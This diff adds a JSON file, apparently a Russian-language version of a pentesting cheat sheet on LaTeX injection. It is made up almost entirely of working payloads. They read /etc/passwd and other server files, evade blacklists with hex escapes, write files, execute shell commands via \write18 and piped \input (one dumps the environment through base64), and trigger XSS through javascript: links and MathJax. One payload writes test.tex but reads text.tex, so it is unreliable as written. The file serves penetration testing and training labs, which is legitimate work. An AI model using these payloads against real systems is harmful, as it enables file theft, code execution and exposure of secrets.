@@ -1,0 +1,128 @@
+{
+  "category": "LaTeX Injection",
+  "source": "PayloadsAllTheThings/LaTeX Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Где встречается LaTeX-инъекция",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "LaTeX используется для подготовки документов и вёрстки — особенно в академической среде, для научных и математических документов.\n\nИнъекция возникает там, где пользовательский ввод попадает в LaTeX-документ, который затем компилируется на сервере (генерация PDF из LaTeX):\n• онлайн-редакторы формул и LaTeX-документов;\n• генераторы PDF — отчёты, инвойсы, дипломы, резюме, справки;\n• поля, которые отрисовываются в итоговый PDF (имя, заголовок, подпись, комментарий).\n\nЗа счёт мощных скриптовых возможностей LaTeX позволяет читать/писать файлы и выполнять команды, если компиляция не изолирована."
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Чтение файла с интерпретацией LaTeX (\\input, \\include)",
+      "language": "latex",
+      "tags": ["file-read", "input", "include"],
+      "body": "\\input{/etc/passwd}\n\\include{somefile} # load .tex file (somefile.tex)",
+      "meta": {
+        "tip": "\\input подставляет и интерпретирует содержимое файла. \\include загружает .tex-файл (для somefile будет загружен somefile.tex)."
+      }
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Чтение однострочного файла (\\openin / \\read)",
+      "language": "latex",
+      "tags": ["file-read", "openin"],
+      "body": "\\newread\\file\n\\openin\\file=/etc/issue\n\\read\\file to\\line\n\\text{\\line}\n\\closein\\file"
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Чтение многострочного файла (\\lstinputlisting, цикл \\read)",
+      "language": "latex",
+      "tags": ["file-read", "lstinputlisting", "loop"],
+      "body": "\\lstinputlisting{/etc/passwd}\n\\newread\\file\n\\openin\\file=/etc/passwd\n\\loop\\unless\\ifeof\\file\n    \\read\\file to\\fileline\n    \\text{\\fileline}\n\\repeat\n\\closein\\file"
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Чтение файла без интерпретации (\\verbatiminput)",
+      "language": "latex",
+      "tags": ["file-read", "verbatim"],
+      "body": "\\usepackage{verbatim}\n\\verbatiminput{/etc/passwd}",
+      "meta": {
+        "tip": "Вставляет сырое содержимое файла как есть, без интерпретации спецсимволов LaTeX."
+      }
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Деактивация спецсимволов через \\catcode (для файлов с $ # _ &)",
+      "language": "latex",
+      "tags": ["file-read", "catcode", "bypass"],
+      "body": "\\catcode `\\$=12\n\\catcode `\\#=12\n\\catcode `\\_=12\n\\catcode `\\&=12\n\\input{path_to_script.pl}",
+      "meta": {
+        "tip": "Если точка инъекции находится после заголовка документа (\\usepackage использовать нельзя), некоторые управляющие символы можно деактивировать, чтобы применить \\input к файлу, содержащему $, #, _, &, null-байты и т.п. (например, perl-скрипты)."
+      }
+    },
+    {
+      "subcategory": "Обход",
+      "title": "Обход чёрного списка через unicode hex (^^)",
+      "language": "latex",
+      "tags": ["bypass", "blacklist", "unicode"],
+      "body": "\\lstin^^70utlisting{/etc/passwd}",
+      "meta": {
+        "tip": "Чтобы обойти чёрный список, замени один символ его unicode hex-значением.\n• ^^41 — заглавная A\n• ^^7e — тильда (~); учти, что 'e' должна быть в нижнем регистре.\nВ примере ^^70 = 'p', то есть \\lstin^^70utlisting → \\lstinputlisting."
+      }
+    },
+    {
+      "subcategory": "Запись файлов",
+      "title": "Запись однострочного файла (\\openout / \\write)",
+      "language": "latex",
+      "tags": ["file-write", "openout", "write"],
+      "body": "\\newwrite\\outfile\n\\openout\\outfile=cmd.tex\n\\write\\outfile{Hello-world}\n\\write\\outfile{Line 2}\n\\write\\outfile{I like trains}\n\\closeout\\outfile"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "Выполнение команды через \\write18 + чтение вывода",
+      "language": "latex",
+      "tags": ["rce", "write18", "command-execution"],
+      "body": "\\immediate\\write18{id > output}\n\\input{output}",
+      "meta": {
+        "tip": "Вывод команды уходит в stdout, поэтому результат нужно сохранять во временный файл и затем читать его через \\input. Требуется компиляция с включённым shell-escape (\\write18)."
+      }
+    },
+    {
+      "subcategory": "RCE",
+      "title": "RCE через base64 (обход плохих символов)",
+      "language": "latex",
+      "tags": ["rce", "write18", "base64", "bypass"],
+      "body": "\\immediate\\write18{env | base64 > test.tex}\n\\input{text.tex}",
+      "meta": {
+        "tip": "Если получаешь ошибку LaTeX, заверни результат в base64, чтобы избавиться от плохих символов (либо используй \\verbatiminput)."
+      }
+    },
+    {
+      "subcategory": "RCE",
+      "title": "RCE через пайп в \\input",
+      "language": "latex",
+      "tags": ["rce", "input", "pipe", "command-execution"],
+      "body": "\\input|ls|base64\n\\input{|\"/bin/hostname\"}"
+    },
+    {
+      "subcategory": "XSS",
+      "title": "XSS через \\url и \\href (javascript:)",
+      "language": "latex",
+      "tags": ["xss", "url", "href"],
+      "body": "\\url{javascript:alert(1)}\n\\href{javascript:alert(1)}{placeholder}",
+      "meta": {
+        "tip": "От @EdOverflow. Срабатывает, когда LaTeX-ссылка попадает в HTML/PDF-вьювер, исполняющий javascript:."
+      }
+    },
+    {
+      "subcategory": "XSS",
+      "title": "XSS в MathJax через \\unicode",
+      "language": "latex",
+      "tags": ["xss", "mathjax", "unicode"],
+      "body": "\\unicode{<img src=1 onerror=\"<ARBITRARY_JS_CODE>\">}",
+      "meta": {
+        "tip": "Работает в MathJax (расширение unicode). Подставь свой JS вместо <ARBITRARY_JS_CODE>."
+      }
+    },
+    {
+      "subcategory": "Лаборатории и ресурсы",
+      "title": "Учебные лаборатории и материалы",
+      "language": "text",
+      "tags": ["labs", "references"],
+      "body": "Лаборатории:\n• Root Me — LaTeX - Input: https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input\n• Root Me — LaTeX - Command Execution: https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution\n\nСтатьи:\n• Hacking with LaTeX — Sebastian Neef\n• Latex to RCE, Private Bug Bounty Program — Yasho\n• Pwning coworkers thanks to LaTeX — scumjr"
+    }
+  ]
+}
